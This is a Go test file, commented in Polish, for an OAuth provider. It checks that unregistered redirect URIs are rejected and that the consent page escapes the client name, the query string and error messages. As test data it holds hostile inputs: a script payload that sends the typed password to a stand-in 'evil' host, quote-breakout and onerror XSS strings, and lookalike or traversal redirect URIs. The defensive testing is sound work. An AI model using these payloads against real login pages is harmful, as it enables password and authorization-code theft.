package oauth

import (
	"net/http/httptest"
	"strings"
	"testing"
)

// Przed poprawką validRedirect kończyło się `return true` — dowolny adres
// przechodził. To jest kradzież kodu autoryzacyjnego: atakujący rejestruje
// klienta, podstawia własny redirect_uri i odbiera cudzy `code` u siebie.
func TestValidRedirectRejectsUnregistered(t *testing.T) {
	registered := []string{"https://claude.ai/api/mcp/auth_callback"}

	if !validRedirect(registered, "https://claude.ai/api/mcp/auth_callback") {
		t.Error("zarejestrowany URI został odrzucony")
	}
	for _, bad := range []string{
		"https://evil.example/steal",
		"https://claude.ai/api/mcp/auth_callback/../../evil",
		"https://claude.ai.evil.example/api/mcp/auth_callback",
		"",
	} {
		if validRedirect(registered, bad) {
			t.Errorf("niezarejestrowany URI przeszedł: %q", bad)
		}
	}
	if validRedirect(nil, "https://cokolwiek.example") {
		t.Error("klient bez zarejestrowanych URI przyjął dowolny adres")
	}
}

// client_name pochodzi z rejestracji, czyli od wołającego. Bez ucieczki
// trafiał surowy do HTML-a strony, na której właściciel wpisuje swoje hasło —
// najgorsze możliwe miejsce na wstrzyknięcie skryptu.
func TestConsentPageEscapesClientName(t *testing.T) {
	p := NewProvider("https://test.example", "sekret")
	p.clients["evil"] = &Client{
		ClientID:     "evil",
		ClientName:   `<script>fetch('//evil/'+document.querySelector('input').value)</script>`,
		RedirectURIs: []string{"https://evil.example/cb"},
	}

	rec := httptest.NewRecorder()
	p.serveConsentPage(rec, map[string][]string{"client_id": {"evil"}}, "")
	body := rec.Body.String()

	if strings.Contains(body, "<script>fetch(") {
		t.Error("client_name trafił do HTML bez ucieczki")
	}
	if !strings.Contains(body, "&lt;script&gt;") {
		t.Error("brak zescapowanej wersji — sprawdź, czy nazwa w ogóle się renderuje")
	}
}

// Query string wraca do atrybutu action. Wartość z cudzysłowem wychodziła
// z atrybutu i dokładała własny HTML.
func TestConsentPageEscapesQueryString(t *testing.T) {
	p := NewProvider("https://test.example", "sekret")
	rec := httptest.NewRecorder()
	p.serveConsentPage(rec, map[string][]string{
		"client_id": {"x"},
		"state":     {`"><script>alert(1)</script>`},
	}, "")
	body := rec.Body.String()

	if strings.Contains(body, `"><script>`) {
		t.Error("query string wyszedł z atrybutu action")
	}
}

func TestConsentPageEscapesErrorMessage(t *testing.T) {
	p := NewProvider("https://test.example", "sekret")
	rec := httptest.NewRecorder()
	p.serveConsentPage(rec, map[string][]string{"client_id": {"x"}}, `<img src=x onerror=alert(1)>`)
	if strings.Contains(rec.Body.String(), "<img src=x") {
		t.Error("komunikat błędu trafił do HTML bez ucieczki")
	}
}
